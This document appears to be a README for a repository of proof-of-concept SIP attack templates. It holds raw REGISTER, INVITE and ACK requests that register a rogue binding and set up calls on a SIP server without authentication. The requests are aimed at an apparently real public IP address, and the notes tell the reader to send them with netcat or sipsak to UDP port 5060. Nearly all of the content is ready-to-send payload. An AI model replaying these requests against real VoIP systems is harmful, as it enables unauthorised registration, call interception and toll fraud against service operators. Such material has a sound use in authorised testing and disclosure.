# SIP Proof of Concept Files

This repository contains proof-of-concept SIP request templates used to demonstrate unauthenticated registration and call setup on the target SIP service.

---

## 📂 Files

### 1. `add-binding.txt`
Registers a new binding (user `datmnky`) without authentication.

```sip
REGISTER sip:5.195.193.177 SIP/2.0
Via: SIP/2.0/UDP 192.168.68.61:5060;branch=z9hG4bKbind1;rport
Max-Forwards: 70
From: <sip:datmnky@5.195.193.177>;tag=03cc6949
To: <sip:datmnky@5.195.193.177>
Call-ID: 5b4939838b97523d271dcbccfd1c93fe84616196
CSeq: 3 REGISTER
Contact: <sip:datmnky@192.168.68.61:5060>
Expires: 3600
Content-Length: 0
```

---

### 2. `remove_binding.txt`
Removes the previously registered binding by setting `Expires: 0`.

```sip
REGISTER sip:5.195.193.177 SIP/2.0
Via: SIP/2.0/UDP 192.168.68.61:5060;branch=z9hG4bKremove1;rport
Max-Forwards: 70
From: <sip:datmnky@5.195.193.177>;tag=03cc6949
To: <sip:datmnky@5.195.193.177>
Call-ID: 5b4939838b97523d271dcbccfd1c93fe84616196
CSeq: 2 REGISTER
Contact: <sip:datmnky@192.168.68.61:5060>
Expires: 0
Content-Length: 0
```

---

### 3. `invite.txt`
Attempts to establish a call session to `datmnky` with unauthenticated INVITE.

```sip
INVITE sip:datmnky@5.195.193.177 SIP/2.0
Via: SIP/2.0/UDP 192.168.68.61:5060;branch=z9hG4bKinv1;rport
Max-Forwards: 70
From: <sip:datmnky@5.195.193.177>;tag=03cc6949
To: <sip:datmnky@5.195.193.177>
Call-ID: 5b4939838b97523d271dcbccfd1c93fe84616196
CSeq: 4 INVITE
Contact: <sip:datmnky@192.168.68.61:5060>
Content-Type: application/sdp
Content-Length: 132

v=0
o=- 0 0 IN IP4 192.168.68.61
s=Test Call
c=IN IP4 192.168.68.61
t=0 0
m=audio 49170 RTP/AVP 0
a=rtpmap:0 PCMU/8000
```

---

### 4. `ack.txt`
Sends ACK to confirm the INVITE/200 OK handshake.

```sip
ACK sip:datmnky@5.195.193.177 SIP/2.0
Via: SIP/2.0/UDP 192.168.68.61:5060;branch=z9hG4bKack1;rport
Max-Forwards: 70
From: <sip:datmnky@5.195.193.177>;tag=03cc6949
To: <sip:datmnky@5.195.193.177>
Call-ID: 5b4939838b97523d271dcbccfd1c93fe84616196
CSeq: 4 ACK
Contact: <sip:datmnky@192.168.68.61:5060>
Content-Length: 0
```

---

## ⚠️ Notes
- These messages were crafted manually for PoC purposes.  
- They demonstrate that the target SIP server does not enforce authentication.  
- For reproduction, send these payloads using `netcat` or `sipsak` against UDP port 5060 of the target.  

